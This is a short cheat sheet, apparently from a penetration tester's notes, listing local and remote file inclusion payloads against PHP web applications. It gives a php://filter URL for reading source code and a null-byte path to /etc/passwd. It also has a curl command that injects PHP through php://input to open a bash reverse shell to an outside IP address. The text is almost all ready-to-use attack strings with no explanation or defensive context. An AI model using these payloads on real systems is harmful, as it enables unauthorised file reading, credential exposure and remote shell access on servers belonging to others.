### LFI

see content of php file
```
http://IP/index.php?m=php://filter/convert.base64-encode/resource=index
```

### RFI
```
http://IP//classes/phpmailer/class.cs_phpmailer.php?classes_dir=/etc/passwd%00

curl -s --data "<?php system('bash -i >& /dev/tcp/172.16.237.245/4545 0>&1
') ?>" "http://10.10.10.10/index.php?ACS_path=php://input%00"

```
